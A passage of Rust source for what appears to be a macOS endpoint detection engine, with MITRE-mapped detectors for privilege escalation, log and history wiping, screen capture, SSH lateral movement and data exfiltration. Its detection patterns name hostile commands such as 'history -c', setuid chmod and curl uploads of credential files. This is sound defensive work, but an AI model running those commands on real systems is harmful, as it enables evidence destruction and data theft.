            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "recon_tool": recon_cmd,
            "mitre_technique": "T1016",
            "confidence": "medium",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_network_recon_detected",
            AlertSeverity::Medium,
            "discovery",
            &format!("{recon_cmd} — network configuration discovery"),
            details,
        ));
    }

    alerts
}

/// Detect rapid filesystem traversal: `find` or `ls -R` covering 3+ distinct
/// top-level directories in a 10-second window.
/// MITRE T1083
fn detect_filesystem_recon(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    const RECON_WINDOW_SECONDS: i64 = 10;
    const DIR_COUNT_THRESHOLD: usize = 3;

    let cutoff = ctx.now - Duration::seconds(RECON_WINDOW_SECONDS);
    let mut alerts = Vec::new();

    // Collect recent find/ls-R invocations from non-system processes
    let recon_processes: Vec<&ProcessInfo> = ctx
        .recent_processes
        .iter()
        .filter(|p| p.process_kind != "system")
        .filter(|p| {
            let cmd = Path::new(&p.command)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("")
                .to_ascii_lowercase();
            let is_find = cmd == "find";
            let is_ls_recursive = cmd == "ls"
                && (p.args.contains("-R")
                    || p.args.contains("-r")
                    || p.args.contains("--recursive"));
            is_find || is_ls_recursive
        })
        .collect();

    if recon_processes.len() < DIR_COUNT_THRESHOLD {
        return alerts;
    }

    // Count unique top-level directories referenced in args
    let mut unique_dirs: std::collections::HashSet<String> = std::collections::HashSet::new();
    for p in &recon_processes {
        // Extract path-like tokens from args
        for token in p.args.split_whitespace() {
            if token.starts_with('/') || token.starts_with('~') {
                let dir = Path::new(token)
                    .components()
                    .take(3)
                    .map(|c| c.as_os_str().to_string_lossy().to_string())
                    .collect::<Vec<_>>()
                    .join("/");
                if !dir.is_empty() {
                    unique_dirs.insert(dir);
                }
            }
        }
    }

    let _ = cutoff; // window check is implicit via recent_processes being from current poll

    if unique_dirs.len() >= DIR_COUNT_THRESHOLD || recon_processes.len() >= DIR_COUNT_THRESHOLD {
        let commands: Vec<String> = recon_processes
            .iter()
            .map(|p| format!("{} {}", p.command, p.args))
            .collect();

        alerts.push(build_alert(
            ctx.now,
            "alert_filesystem_recon_detected",
            AlertSeverity::Medium,
            "discovery",
            "Rapid filesystem traversal: multiple find/ls-R invocations in a short window",
            json!({
                "invocation_count": recon_processes.len(),
                "unique_dirs": unique_dirs.len(),
                "commands": commands,
                "mitre_technique": "T1083",
                "confidence": "medium",
                "threshold_invocations": DIR_COUNT_THRESHOLD,
            }),
        ));
    }

    alerts
}

// ─── Privilege escalation detection ──────────────────────────────────────────
//
// MITRE T1548.001 — Setuid/Setgid
// MITRE T1548.004 — Elevated Execution with Prompt
// MITRE T1548.003 — Sudo and Sudo Caching

/// Detect privilege escalation patterns:
/// - sudo called by a process with a Downloads-origin or interpreter parent
/// - chmod setting setuid/setgid (broader than CPR-011: also catches u+s, g+s)
/// - AuthorizationExecuteWithPrivileges via osascript do shell script with administrator
fn detect_privilege_escalation(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // ── sudo from suspicious parent ───────────────────────────────────────
        if cmd_basename == "sudo" {
            let parent_is_suspicious = matches!(
                process.parent_process_kind.as_deref(),
                Some("interpreter") | Some("unknown")
            ) || process
                .parent_command
                .as_deref()
                .map(|c| c.to_ascii_lowercase().contains("/downloads/"))
                .unwrap_or(false)
                || process.behavior.references_downloads_path;

            if parent_is_suspicious {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "parent_command": process.parent_command,
                    "parent_process_kind": process.parent_process_kind,
                    "mitre_technique": "T1548.003",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_suspicious_sudo_execution",
                    AlertSeverity::High,
                    "privilege_escalation",
                    "sudo called from an interpreter or Downloads-origin process",
                    details,
                ));
            }
        }

        // ── chmod setting setuid/setgid (u+s, g+s, a+s patterns) ─────────────
        // CPR-011 already covers +s, 4755, 4711, 4777.
        // This covers additional numeric forms and g+s.
        if cmd_basename == "chmod" {
            let sets_suid = args_lower.contains("u+s")
                || args_lower.contains("a+s")
                || args_lower.contains("g+s")
                || args_lower.contains(" 2755")
                || args_lower.contains(" 2711")
                || args_lower.contains(" 6755");

            if sets_suid {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "mitre_technique": "T1548.001",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_privilege_escalation_attempt",
                    AlertSeverity::High,
                    "privilege_escalation",
                    "chmod setting setuid or setgid bit",
                    details,
                ));
            }
        }

        // ── osascript administrator shell (AuthorizationExecuteWithPrivileges) ─
        if cmd_basename == "osascript" {
            let args_full = format!("{} {}", process.command, process.args).to_ascii_lowercase();
            let has_admin_shell = args_full.contains("administrator")
                && (args_full.contains("do shell script") || args_full.contains("with administrator"));

            if has_admin_shell {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "mitre_technique": "T1548.004",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_privilege_escalation_attempt",
                    AlertSeverity::High,
                    "privilege_escalation",
                    "osascript do shell script with administrator privileges",
                    details,
                ));
            }
        }
    }

    alerts
}

// ─── Indicator removal detection ─────────────────────────────────────────────
//
// Detects attempts to cover tracks / remove forensic evidence.
// MITRE T1070 — Indicator Removal on Host

/// Detect attempts to clear or destroy forensic evidence:
/// - Shell history cleared (history -c or HISTFILE=/dev/null)
/// - Deletion of files under log paths or runtime/logs/
/// - rm -rf targeting evidence paths
/// - xattr removing quarantine attributes (broader than CPR-009)
fn detect_indicator_removal(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();
        let full_lower = format!("{} {}", process.command, process.args).to_ascii_lowercase();

        // ── Shell history clearing ─────────────────────────────────────────────
        if matches!(cmd_basename.as_str(), "bash" | "sh" | "zsh" | "fish") {
            let clears_history = args_lower.contains("history -c")
                || args_lower.contains("history -w /dev/null")
                || args_lower.contains("histfile=/dev/null")
                || args_lower.contains("> ~/.bash_history")
                || args_lower.contains("> ~/.zsh_history")
                || args_lower.contains("unset histfile");

            if clears_history {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "sub_type": "history_cleared",
                    "mitre_technique": "T1070.003",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_indicator_removal_attempt",
                    AlertSeverity::High,
                    "defense_evasion",
                    "Shell history cleared or redirected to /dev/null",
                    details,
                ));
            }
        }

        // ── Deletion targeting log or evidence paths ───────────────────────────
        if matches!(cmd_basename.as_str(), "rm" | "shred" | "srm") {
            let targets_logs = full_lower.contains("/var/log")
                || full_lower.contains("/private/var/log")
                || full_lower.contains("runtime/logs")
                || full_lower.contains(".bash_history")
                || full_lower.contains(".zsh_history")
                || full_lower.contains(".history")
                || full_lower.contains("agent-events.jsonl")
                || full_lower.contains("response-audit.jsonl");

            if targets_logs {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "sub_type": "log_deletion",
                    "mitre_technique": "T1070.002",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_indicator_removal_attempt",
                    AlertSeverity::High,
                    "defense_evasion",
                    "rm/shred targeting log files or evidence paths",
                    details,
                ));
            }

            // Also flag rm -rf targeting broad user directories when called by interpreter
            if process.process_kind == "interpreter"
                && (args_lower.contains("-rf") || args_lower.contains("-fr"))
                && (args_lower.contains("/documents")
                    || args_lower.contains("/downloads")
                    || args_lower.contains("/desktop"))
            {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "sub_type": "recursive_deletion",
                    "mitre_technique": "T1070",
                    "confidence": "medium",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_indicator_removal_attempt",
                    AlertSeverity::High,
                    "defense_evasion",
                    "Interpreter executing recursive deletion of user directory",
                    details,
                ));
            }
        }

        // ── xattr removal (broader than CPR-009 quarantine-specific) ─────────
        // CPR-009 catches com.apple.quarantine specifically.
        // Here we flag removal of ANY security-relevant xattr by a non-system process.
        if cmd_basename == "xattr" && args_lower.contains("-d") && process.process_kind != "system" {
            let is_security_xattr = args_lower.contains("com.apple.quarantine")
                || args_lower.contains("com.apple.security")
                || args_lower.contains("com.apple.provenance")
                || args_lower.contains("com.apple.rootless");

            if is_security_xattr {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "sub_type": "xattr_removal",
                    "mitre_technique": "T1070.006",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_indicator_removal_attempt",
                    AlertSeverity::High,
                    "defense_evasion",
                    "xattr -d removing a security-relevant extended attribute",
                    details,
                ));
            }
        }
    }

    alerts
}

// ─── Screen capture & input monitoring ───────────────────────────────────────
//
// MITRE T1113 — Screen Capture

/// Processes that are legitimate screen capture / media tools operated by the
/// user themselves (meeting apps, OBS, QuickTime, etc.).
/// We suppress alerts for these to avoid constant noise during normal video calls.
const KNOWN_MEDIA_APPS: &[&str] = &[
    "zoom",
    "teams",
    "skype",
    "facetime",
    "webex",
    "slack",
    "discord",
    "obs",
    "quicktime",
    "screencaptureui",   // macOS screenshot tool UI
    "com.apple.screencapture",
    "recordmydesktop",
    "loom",
];

/// Detect screen capture and suspicious media access:
/// - `screencapture` or `screenshot` invoked by a non-system process → alert_screen_capture_attempt
/// - `imagesnap` (third-party CLI camera capture) or ffmpeg by a suspicious-origin process → alert_suspicious_media_access
/// MITRE T1113
fn detect_screen_capture(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        if process.process_kind == "system" {
            continue;
        }

        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        // ── screencapture / screenshot ────────────────────────────────────────
        if cmd_basename == "screencapture" || cmd_basename == "screenshot" {
            // Suppress if launched from a known media/meeting application context
            let from_known_app = process
                .parent_command
                .as_deref()
                .map(|c| {
                    let c_lower = c.to_ascii_lowercase();
                    KNOWN_MEDIA_APPS.iter().any(|app| c_lower.contains(app))
                })
                .unwrap_or(false)
                || {
                    let cmd_lower = process.command.to_ascii_lowercase();
                    KNOWN_MEDIA_APPS.iter().any(|app| cmd_lower.contains(app))
                };

            if !from_known_app {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "parent_command": process.parent_command,
                    "mitre_technique": "T1113",
                    "confidence": "medium",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_screen_capture_attempt",
                    AlertSeverity::High,
                    "collection",
                    "screencapture invoked by a non-system, non-media process",
                    details,
                ));
            }
        }

        // ── imagesnap / ffmpeg / avconvert from suspicious-origin process ─────
        // imagesnap is a third-party CLI tool with no legitimate non-media use.
        // ffmpeg/avconvert from Downloads or interpreter parents is suspicious.
        let is_camera_tool = cmd_basename == "imagesnap";
        let is_media_encoder_from_suspicious_origin = matches!(cmd_basename.as_str(), "ffmpeg" | "avconvert")
            && (matches!(
                process.process_kind.as_str(),
                "interpreter" | "unknown"
            ) || process
                .command
                .to_ascii_lowercase()
                .contains("/downloads/")
            || process
                .parent_command
                .as_deref()
                .map(|c| c.to_ascii_lowercase().contains("/downloads/"))
                .unwrap_or(false));

        if is_camera_tool || is_media_encoder_from_suspicious_origin {
            let from_known_app = {
                let cmd_lower = process.command.to_ascii_lowercase();
                let parent_lower = process
                    .parent_command
                    .as_deref()
                    .unwrap_or("")
                    .to_ascii_lowercase();
                KNOWN_MEDIA_APPS
                    .iter()
                    .any(|app| cmd_lower.contains(app) || parent_lower.contains(app))
            };

            if !from_known_app {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "parent_command": process.parent_command,
                    "parent_process_kind": process.parent_process_kind,
                    "capture_tool": cmd_basename,
                    "mitre_technique": "T1113",
                    "confidence": if is_camera_tool { "high" } else { "medium" },
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_suspicious_media_access",
                    AlertSeverity::High,
                    "collection",
                    "Media capture tool invoked by a suspicious or interpreter-origin process",
                    details,
                ));
            }
        }
    }

    alerts
}

// ─── Data staging & archive detection ────────────────────────────────────────
//
// MITRE T1005 — Data from Local System (staging)
// MITRE T1560 — Archive Collected Data

/// Staging output locations that are suspicious when used as archive destinations.
const SUSPICIOUS_STAGING_DIRS: &[&str] = &[
    "/tmp/",
    "/private/tmp/",
    "/var/folders/",
    "/.trash/",
    "/trash/",
];

/// Detect data staging and suspicious archive creation:
/// - zip/tar/ditto/rsync writing to /tmp, ~/.Trash, or other non-standard staging paths → alert_suspicious_archive_creation
/// - zip/tar invoked by an interpreter or a process from Downloads → alert_suspicious_archive_creation
/// - Multiple cp/mv operations copying into a single directory rapidly → alert_data_staging_detected
fn detect_data_staging(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    const STAGING_FILE_THRESHOLD: usize = 10;
    const STAGING_WINDOW_SECONDS: i64 = 60;

    let mut alerts = Vec::new();

    // ── Archive tool to suspicious staging location ───────────────────────────
    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();
        let full_lower = format!("{} {}", process.command, process.args).to_ascii_lowercase();

        let is_archive_tool = matches!(cmd_basename.as_str(), "zip" | "tar" | "ditto" | "rsync" | "gzip" | "bzip2" | "xz");

        if !is_archive_tool {
            continue;
        }

        // Check if output destination is a suspicious staging path
        let to_staging = SUSPICIOUS_STAGING_DIRS
            .iter()
            .any(|dir| full_lower.contains(dir));

        // Check if the archive tool is invoked by an interpreter or from Downloads
        let suspicious_origin = matches!(
            process.process_kind.as_str(),
            "interpreter" | "unknown"
        ) || args_lower.contains("/downloads/")
            || process
                .parent_command
                .as_deref()
                .map(|c| c.to_ascii_lowercase().contains("/downloads/"))
                .unwrap_or(false)
            || matches!(
                process.parent_process_kind.as_deref(),
                Some("interpreter") | Some("unknown")
            );

        if to_staging || suspicious_origin {
            let reason = if to_staging {
                "Archive tool writing to a known data staging location (tmp, Trash, etc.)"
            } else {
                "Archive tool invoked by interpreter or Downloads-origin process"
            };

            let mut details = json!({
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "parent_command": process.parent_command,
                "parent_process_kind": process.parent_process_kind,
                "archive_tool": cmd_basename,
                "to_staging_location": to_staging,
                "suspicious_origin": suspicious_origin,
                "mitre_technique": if to_staging { "T1560" } else { "T1005" },
                "confidence": if to_staging && suspicious_origin { "high" } else { "medium" },
            });
            merge_chain_details(&mut details, chain_details(process.pid, ctx));

            alerts.push(build_alert(
                ctx.now,
                "alert_suspicious_archive_creation",
                AlertSeverity::High,
                "collection",
                reason,
                details,
            ));
        }
    }

    // ── Bulk file copy / staging detection via file events ────────────────────
    // Count files copied into the same destination directory in the last 60 seconds.
    let staging_cutoff = ctx.now - Duration::seconds(STAGING_WINDOW_SECONDS);
    let mut dest_dir_counts: HashMap<String, usize> = HashMap::new();

    for event in &ctx.recent_file_events {
        if event.timestamp < staging_cutoff {
            continue;
        }
        // Look for newly created or modified files in non-standard staging directories
        if !matches!(event.kind.as_str(), "file_created" | "file_modified") {
            continue;
        }
        let path_lower = event.path.to_ascii_lowercase();
        let is_staging = SUSPICIOUS_STAGING_DIRS
            .iter()
            .any(|dir| path_lower.contains(dir));
        if is_staging {
            let dir = parent_dir_string(&event.path);
            *dest_dir_counts.entry(dir).or_insert(0) += 1;
        }
    }

    for (staging_dir, count) in dest_dir_counts {
        if count >= STAGING_FILE_THRESHOLD {
            alerts.push(build_alert(
                ctx.now,
                "alert_data_staging_detected",
                AlertSeverity::High,
                "collection",
                "Large number of files being staged in a temporary or unusual directory",
                json!({
                    "staging_directory": staging_dir,
                    "file_count_in_window": count,
                    "window_seconds": STAGING_WINDOW_SECONDS,
                    "threshold": STAGING_FILE_THRESHOLD,
                    "mitre_technique": "T1005",
                    "confidence": "medium",
                }),
            ));
        }
    }

    alerts
}

// ─── SSH & lateral movement detection ────────────────────────────────────────
//
// MITRE T1021.004 — SSH

/// Detect SSH-based lateral movement and key tampering:
/// - ssh with -o StrictHostKeyChecking=no or non-standard -i identity file → alert_ssh_lateral_movement
/// - scp/rsync by interpreter or Downloads-origin → alert_ssh_lateral_movement
/// - New files written to ~/.ssh/authorized_keys → alert_ssh_key_tampering
/// - Non-ssh processes reading ~/.ssh/config or ~/.ssh/known_hosts → alert_ssh_key_tampering
fn detect_ssh_lateral_movement(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    // ── Process-based SSH abuse ───────────────────────────────────────────────
    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        let args_lower = process.args.to_ascii_lowercase();

        // ssh with StrictHostKeyChecking disabled or unusual identity file
        if cmd_basename == "ssh" {
            let disables_host_check = args_lower.contains("stricthostkeychecking=no")
                || args_lower.contains("stricthostkeychecking no");

            // Identity file from a non-standard location (not ~/.ssh/)
            let has_unusual_identity = if let Some(idx) = args_lower.find(" -i ") {
                let after = &args_lower[idx + 4..];
                let path = after.split_whitespace().next().unwrap_or("");
                !path.is_empty()
                    && !path.contains("/.ssh/")
                    && !path.starts_with("/etc/ssh/")
            } else {
                false
            };

            if disables_host_check || has_unusual_identity {
                let reason = if disables_host_check {
                    "ssh invoked with StrictHostKeyChecking disabled — MITM risk"
                } else {
                    "ssh invoked with identity file from a non-standard path"
                };

                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "parent_command": process.parent_command,
                    "parent_process_kind": process.parent_process_kind,
                    "disables_host_check": disables_host_check,
                    "has_unusual_identity": has_unusual_identity,
                    "mitre_technique": "T1021.004",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_ssh_lateral_movement",
                    AlertSeverity::High,
                    "lateral_movement",
                    reason,
                    details,
                ));
            }
        }

        // scp / rsync by interpreter or Downloads-origin process
        if matches!(cmd_basename.as_str(), "scp" | "rsync") {
            let suspicious_origin = matches!(
                process.process_kind.as_str(),
                "interpreter" | "unknown"
            ) || matches!(
                process.parent_process_kind.as_deref(),
                Some("interpreter") | Some("unknown")
            ) || process
                .command
                .to_ascii_lowercase()
                .contains("/downloads/")
            || process
                .parent_command
                .as_deref()
                .map(|c| c.to_ascii_lowercase().contains("/downloads/"))
                .unwrap_or(false);

            if suspicious_origin {
                let mut details = json!({
                    "pid": process.pid,
                    "ppid": process.ppid,
                    "command": process.command,
                    "args": process.args,
                    "process_kind": process.process_kind,
                    "parent_command": process.parent_command,
                    "parent_process_kind": process.parent_process_kind,
                    "transfer_tool": cmd_basename,
                    "mitre_technique": "T1021.004",
                    "confidence": "high",
                });
                merge_chain_details(&mut details, chain_details(process.pid, ctx));

                alerts.push(build_alert(
                    ctx.now,
                    "alert_ssh_lateral_movement",
                    AlertSeverity::High,
                    "lateral_movement",
                    "scp/rsync invoked by interpreter or Downloads-origin process — potential data transfer",
                    details,
                ));
            }
        }

        // Non-ssh processes reading SSH config or known_hosts
        let reads_ssh_config = args_lower.contains("/.ssh/config")
            || args_lower.contains("/.ssh/known_hosts");

        if reads_ssh_config
            && !matches!(cmd_basename.as_str(), "ssh" | "scp" | "sftp" | "rsync" | "git" | "gh")
            && process.process_kind != "system"
        {
            let mut details = json!({
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "parent_command": process.parent_command,
                "mitre_technique": "T1021.004",
                "confidence": "medium",
            });
            merge_chain_details(&mut details, chain_details(process.pid, ctx));

            alerts.push(build_alert(
                ctx.now,
                "alert_ssh_key_tampering",
                AlertSeverity::Medium,
                "lateral_movement",
                "Non-SSH process reading SSH configuration or known_hosts file",
                details,
            ));
        }
    }

    // ── File-event based: writes to authorized_keys ───────────────────────────
    for event in &ctx.recent_file_events {
        if !matches!(event.kind.as_str(), "file_created" | "file_modified") {
            continue;
        }
        let path_lower = event.path.to_ascii_lowercase();
        if path_lower.contains("/.ssh/authorized_keys") {
            alerts.push(build_alert(
                ctx.now,
                "alert_ssh_key_tampering",
                AlertSeverity::Critical,
                "lateral_movement",
                "authorized_keys file was created or modified — backdoor SSH access risk",
                json!({
                    "path": event.path,
                    "event_kind": event.kind,
                    "mitre_technique": "T1098.004",
                    "confidence": "high",
                    "reason": "Modification of ~/.ssh/authorized_keys enables unauthorized SSH access",
                }),
            ));
        }
    }

    alerts
}

// ─── Browser extension & plugin monitoring ────────────────────────────────────
//
// MITRE T1176 — Browser Extensions

/// Monitored browser extension directory fragments.
/// These are the canonical install paths for Chrome, Firefox, and Safari.
const BROWSER_EXTENSION_PATHS: &[&str] = &[
    "google/chrome/default/extensions/",
    "google/chrome/profile",       // any profile, not just Default
    "firefox/profiles/",           // covers *.default-release/extensions/
    "library/safari/extensions/",
    "library/safari/appextensions/",
    "chromium/default/extensions/",
    "microsoft edge/default/extensions/",
    "brave browser/default/extensions/",
];

/// Detect a browser extension being installed:
/// - New file event in a known browser extension directory
/// - Raises confidence when a recent interpreter or download was also seen
fn detect_browser_extension_installed(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    const CORRELATION_WINDOW_SECONDS: i64 = 120;
    let mut alerts = Vec::new();

    // Check for recent interpreter execution or download activity
    let recent_suspicious_activity = ctx.recent_processes.iter().any(|p| {
        matches!(p.process_kind.as_str(), "interpreter" | "unknown")
    }) || ctx.recent_file_events.iter().any(|e| {
        let age = ctx
            .now
            .signed_duration_since(e.timestamp)
            .num_seconds();
        age >= 0
            && age <= CORRELATION_WINDOW_SECONDS
            && e.path.to_ascii_lowercase().contains("/downloads/")
    });

    for event in &ctx.recent_file_events {
        if !matches!(event.kind.as_str(), "file_created" | "file_modified") {
            continue;
        }

        let path_lower = event.path.to_ascii_lowercase();

        let is_extension_path = BROWSER_EXTENSION_PATHS
            .iter()
            .any(|ext_path| path_lower.contains(ext_path));

        if !is_extension_path {
            continue;
        }

        // Identify which browser
        let browser = if path_lower.contains("chrome") {
            "Chrome"
        } else if path_lower.contains("firefox") {
            "Firefox"
        } else if path_lower.contains("safari") {
            "Safari"
        } else if path_lower.contains("edge") {
            "Edge"
        } else if path_lower.contains("brave") {
            "Brave"
        } else {
            "Unknown"
        };

        let confidence = if recent_suspicious_activity {
            "high"
        } else {
            "medium"
        };

        alerts.push(build_alert(
            ctx.now,
            "alert_browser_extension_installed",
            if recent_suspicious_activity {
                AlertSeverity::High
            } else {
                AlertSeverity::Medium
            },
            "persistence",
            "A browser extension was installed or modified",
            json!({
                "path": event.path,
                "browser": browser,
                "event_kind": event.kind,
                "correlated_with_suspicious_activity": recent_suspicious_activity,
                "mitre_technique": "T1176",
                "confidence": confidence,
            }),
        ));
    }

    alerts
}

// ─── Exfiltration pattern detection ──────────────────────────────────────────
//
// MITRE T1041 — Exfiltration Over C2 Channel
// MITRE T1567 — Exfiltration Over Web Service

/// curl/wget flags that indicate data upload rather than download.
const UPLOAD_FLAGS: &[&str] = &[
    "--data",
    "--data-binary",
    "--data-raw",
    "--data-urlencode",
    " -d ",
    "--upload-file",
    " -t ",
    " -f ",     // multipart form upload
    "--form",
    "--json",   // implies sending data
];

/// Detect exfiltration via command-line data upload or suspicious correlated patterns:
/// - curl/wget with upload flags → alert_upload_command_detected (T1567)
/// - Upload command referencing user document paths as the data source → alert_suspected_exfiltration (T1041)
fn detect_exfiltration_pattern(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        if !matches!(cmd_basename.as_str(), "curl" | "wget" | "python" | "python3" | "ruby" | "perl" | "node") {
            continue;
        }

        let args_lower = process.args.to_ascii_lowercase();
        let full_lower = format!("{} {}", process.command, process.args).to_ascii_lowercase();

        // ── Upload flag detection (T1567) ────────────────────────────────────
        // For curl/wget: check for upload flags
        // Prepend a space so flags at position 0 are still matched by patterns like " -d "
        let padded_args = format!(" {}", args_lower);
        let has_upload_flag = if matches!(cmd_basename.as_str(), "curl" | "wget") {
            UPLOAD_FLAGS.iter().any(|flag| padded_args.contains(flag))
        } else {
            false
        };

        // For any process: check for inline HTTP POST patterns (urllib, requests, etc.)
        let has_http_post_pattern = matches!(cmd_basename.as_str(), "python" | "python3" | "ruby" | "perl" | "node")
            && (args_lower.contains("requests.post")
                || args_lower.contains("http.request(\"post")
                || args_lower.contains(".post(\"http")
                || args_lower.contains("net/http")
                    && args_lower.contains("post"));

        if has_upload_flag || has_http_post_pattern {
            // Determine if the data source references user document paths
            // e.g., curl -d @/Users/victim/Documents/creds.txt
            let exfils_user_data = full_lower.contains("/documents/")
                || full_lower.contains("/desktop/")
                || full_lower.contains("/downloads/")
                || full_lower.contains("/.ssh/")
                || full_lower.contains("/.aws/")
                || full_lower.contains("keychain");

            let (event_type, severity, mitre, confidence, reason) = if exfils_user_data {
                (
                    "alert_suspected_exfiltration",
                    AlertSeverity::Critical,
                    "T1041",
                    "high",
                    "Upload command referencing user document or credential paths — likely data exfiltration",
                )
            } else {
                (
                    "alert_upload_command_detected",
                    AlertSeverity::High,
                    "T1567",
                    "medium",
                    "curl/wget or HTTP client invoked with upload flags — potential data transmission",
                )
            };

            let mut details = json!({
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "parent_command": process.parent_command,
                "parent_process_kind": process.parent_process_kind,
                "has_upload_flag": has_upload_flag,
                "references_user_data": exfils_user_data,
                "mitre_technique": mitre,
                "confidence": confidence,
            });
            merge_chain_details(&mut details, chain_details(process.pid, ctx));

            alerts.push(build_alert(
                ctx.now,
                event_type,
                severity,
                "exfiltration",
                reason,
                details,
            ));
        }
    }

    alerts
}

// ─── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use crate::baseline::BaselineSnapshot;
    use crate::execution_graph::ExecutionGraphSnapshot;
    use crate::lineage::LineageSnapshot;
    use crate::models::{FileEventRecord, ProcessInfo};
    use crate::provenance::ArtifactProvenanceSnapshot;
    use chrono::{Duration, Utc};

    // ── Helpers ────────────────────────────────────────────────────────────────

    fn empty_ctx(now: chrono::DateTime<Utc>) -> DetectionContext {
        DetectionContext {
            recent_file_events: Vec::new(),
            current_processes: Vec::new(),
            recent_processes: Vec::new(),
            execution_graph: ExecutionGraphSnapshot::default(),
            lineage: LineageSnapshot::default(),
            provenance: ArtifactProvenanceSnapshot::default(),
            baseline: BaselineSnapshot::default(),
            now,
        }
    }

    fn make_file_event(
        kind: &str,
        path: &str,
        is_executable: bool,
        has_quarantine: bool,
        age_seconds: i64,
    ) -> FileEventRecord {
        FileEventRecord {
            kind: kind.to_string(),
            path: path.to_string(),
            timestamp: Utc::now() - Duration::seconds(age_seconds),
            size_bytes: 1024,
            is_executable,
            has_quarantine,
            quarantine_value: None,
            magic_bytes_hint: None,
        }
    }

    fn make_file_event_with_magic(
        kind: &str,
        path: &str,
        magic: Option<&str>,
    ) -> FileEventRecord {
        FileEventRecord {
            kind: kind.to_string(),
            path: path.to_string(),
            timestamp: Utc::now(),
            size_bytes: 1024,
            is_executable: false,
            has_quarantine: false,
            quarantine_value: None,
            magic_bytes_hint: magic.map(|s| s.to_string()),
        }
    }

    fn make_process(
        pid: i32,
        ppid: i32,
        command: &str,
        args: &str,
        process_kind: &str,
    ) -> ProcessInfo {
        use crate::command_features::extract_features;
        use crate::classify::classify_path;
        ProcessInfo {
            pid,
            ppid,
            command: command.to_string(),
            args: args.to_string(),
            process_kind: process_kind.to_string(),
